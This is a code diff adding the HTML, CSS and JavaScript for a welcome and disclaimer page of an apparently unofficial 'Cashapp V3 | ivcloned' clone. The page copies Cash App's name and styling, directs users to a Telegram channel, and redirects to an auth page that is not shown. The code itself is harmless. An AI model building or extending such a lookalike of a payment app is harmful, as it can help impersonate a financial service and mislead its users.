@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Welcome | Cash App</title>
+
+    <!-- 1. Anti-Flicker & Persistence Guard Script -->
+    <script>
+      (function () {
+        // A. Check if user has already accepted the disclaimer
+        // If "true", we SKIP this page and go straight to auth.html
+        if (localStorage.getItem("ivcloned_welcome_v3_seen") === "true") {
+          window.location.replace("auth.html"); // Immediate skip
+        }
+
+        // B. Dark Mode Logic
+        let theme =
+          window.localStorage.getItem("app-theme-preference") || "system";
+        if (theme === "system") {
+          theme = window.matchMedia("(prefers-color-scheme: dark)").matches
+            ? "dark"
+            : "light";
+        }
+        document.documentElement.setAttribute("data-theme", theme);
+      })();
+    </script>
+
+    <style>
+      /* --- FONT SETUP --- */
+      @font-face {
+        font-family: "CashMarketR";
+        font-style: normal;
+        src: url(font/CashMarket-RegularRounded.otf);
+        font-display: swap;
+      }
+
+      :root {
+        /* --- Dark Mode Variables (Default) --- */
+        --bg-color: #1c1c1e;
+        --text-primary: #ffffff;
+        --text-secondary: #8d8d8d;
+        --container-border: #00bc06; /* Green border for warning box */
+        --link-color: #2d9cdb; /* Blue for links */
+
+        /* Checkbox Colors */
+        --checkbox-bg: #474749;
+
+        /* Button Colors */
+        --btn-color: #00bc06;
+        --btn-text: #ffffff;
+      }
+
+      [data-theme="light"] {
+        --bg-color: #ffffff;
+        --text-primary: #000000;
+        --text-secondary: #6e6e6e;
+        --checkbox-bg: #e0e0e0;
+        --btn-color: #00bc06;
+        --btn-text: #ffffff;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        font-family: "CashMarketR", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-primary);
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        transition: background-color 0.3s ease, color 0.3s ease;
+      }
+
+      .app-container {
+        width: 100%;
+        max-width: 480px;
+        margin: 0 auto;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        padding: 20px 24px;
+        position: relative;
+      }
+
+      /* --- HEADER --- */
+      .header {
+        margin-top: 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 20px;
+      }
+
+      .header-text h1 {
+        font-size: 28px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        margin-bottom: 5px;
+      }
+
+      .header-text p {
+        color: var(--text-secondary);
+        font-size: 15px;
+        font-weight: 500;
+      }
+
+      .header-right {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+        margin-top: 10px;
+      }
+
+      .step-indicator {
+        color: var(--text-primary);
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      /* --- MAIN CONTENT (WARNING BOX) --- */
+      .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+        margin-bottom: 20px;
+        overflow-y: auto;
+      }
+
+      .warning-box {
+        border: 1px solid var(--container-border);
+        border-radius: 16px;
+        padding: 20px;
+        font-size: 14px;
+        line-height: 1.4;
+        font-weight: 500;
+        color: var(--text-primary);
+        background-color: rgba(255, 255, 255, 0.02);
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+      }
+
+      .warning-text strong {
+        color: var(--text-primary);
+        font-weight: 600;
+      }
+
+      /* Link Styling */
+      .link-text {
+        color: var(--link-color);
+        font-weight: 600;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .link-text:hover {
+        text-decoration: underline;
+      }
+
+      /* --- CHECKBOX AREA --- */
+      .checkbox-container {
+        margin-top: 10px;
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        font-size: 11px;
+        color: var(--text-secondary);
+        line-height: 1.3;
+        padding-top: 10px;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      /* Custom Checkbox Styling */
+      input[type="checkbox"] {
+        -webkit-appearance: none;
+        appearance: none;
+        background-color: transparent;
+        margin: 0;
+        font: inherit;
+        color: currentColor;
+        width: 20px;
+        height: 20px;
+        border: 2px solid var(--text-secondary);
+        border-radius: 6px;
+        display: grid;
+        place-content: center;
+        flex-shrink: 0;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      input[type="checkbox"]::before {
+        content: "";
+        width: 10px;
+        height: 10px;
+        transform: scale(0);
+        transition: 120ms transform ease-in-out;
+        box-shadow: inset 1em 1em var(--bg-color);
+        transform-origin: center;
+        clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
+        background-color: var(--bg-color);
+      }
+
+      input[type="checkbox"]:checked {
+        background-color: var(--text-primary);
+        border-color: var(--text-primary);
+      }
+
+      input[type="checkbox"]:checked::before {
+        transform: scale(1);
+        background-color: var(--bg-color);
+      }
+
+      /* --- FOOTER / BUTTON --- */
+      .footer {
+        margin-bottom: 30px;
+        width: 100%;
+        padding-top: 10px;
+      }
+
+      .continue-btn {
+        width: 100%;
+        background-color: var(--btn-color);
+        color: var(--btn-text);
+        border: none;
+        border-radius: 50px;
+        padding: 16px;
+        font-size: 17px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-align: center;
+      }
+
+      .continue-btn:disabled {
+        cursor: default;
+        background-color: var(--btn-color);
+        opacity: 0.85;
+        color: rgba(255, 255, 255, 0.3);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="app-container">
+      <!-- Header -->
+      <div class="header">
+        <div class="header-text">
+          <h1>Welcome</h1>
+          <p>Cashapp V3 | ivcloned</p>
+        </div>
+        <!-- Step 1 of 3 -->
+        <div class="header-right">
+          <div class="step-indicator">1 of 3</div>
+        </div>
+      </div>
+
+      <!-- Main Content: Warning Box -->
+      <div class="main-content">
+        <div class="warning-box">
+          <p class="warning-text">
+            We want to bring a crucial matter to your attention. If you have not
+            obtained our app, Cashapp V3, directly from our official source,
+            <a href="https://t.me/iv_cloned" target="_blank" class="link-text"
+              >ivcloned</a
+            >, it's essential to be aware that the app you've downloaded could
+            potentially be a spam or an unauthorized version.
+          </p>
+
+          <p class="warning-text">
+            We strongly advise against downloading and installing applications
+            from unofficial sources, as this may expose your device to security
+            threats, malware, and possible breaches of your personal data. To
+            guarantee a secure and reliable experience, we recommend exclusively
+            obtaining Cashapp V3 from the
+            <a href="https://t.me/iv_cloned" target="_blank" class="link-text"
+              >official ivcloned Telegram channel</a
+            >.
+          </p>
+
+          <p class="warning-text">
+            If you find yourself uncertain about the legitimacy of the app
+            you've acquired, please don't hesitate to get in touch with our
+            support team at
+            <a href="https://t.me/iv_cloned" target="_blank" class="link-text"
+              >Telegram</a
+            >. Our team is available to guide you and offer assistance in the
+            proper installation of our app.
+          </p>
+
+          <!-- Checkbox -->
+          <div class="checkbox-container">
+            <input type="checkbox" id="acknowledgeCheck" />
+            <label for="acknowledgeCheck">
+              By checking this box, I acknowledge that I have read and
+              understood the important warning about downloading the app from
+              sources other than ivcloned.
+            </label>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer Button -->
+      <div class="footer">
+        <button id="continueBtn" class="continue-btn" disabled>Continue</button>
+      </div>
+    </div>
+
+    <script>
+      const checkInput = document.getElementById("acknowledgeCheck");
+      const continueBtn = document.getElementById("continueBtn");
+
+      // 1. Validation Logic: Toggle Button State
+      checkInput.addEventListener("change", function () {
+        if (this.checked) {
+          // Enable Button
+          continueBtn.removeAttribute("disabled");
+          continueBtn.style.color = "#FFFFFF";
+          continueBtn.style.opacity = "1";
+        } else {
+          // Disable Button
+          continueBtn.setAttribute("disabled", "true");
+          continueBtn.style.color = "rgba(255, 255, 255, 0.3)";
+          continueBtn.style.opacity = "0.85";
+        }
+      });
+
+      // 2. Submit Logic: Save Flag & Redirect
+      continueBtn.addEventListener("click", function () {
+        // Save the flag that we have seen this page
+        localStorage.setItem("ivcloned_welcome_v3_seen", "true");
+
+        // Redirect to the Auth page
+        window.location.href = "auth.html";
+      });
+    </script>
+  </body>
+</html>
